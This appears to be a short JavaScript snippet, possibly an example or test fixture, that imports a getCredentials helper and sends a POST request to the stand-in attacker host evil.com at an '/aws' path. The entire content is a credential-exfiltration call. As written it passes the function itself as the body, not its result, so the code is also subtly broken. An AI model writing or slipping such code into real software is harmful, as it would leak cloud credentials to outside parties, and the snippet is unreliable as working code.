const { getCredentials } = require('./utils');

fetch('https://evil.com/aws', {
  method: 'POST',
  body: getCredentials
});
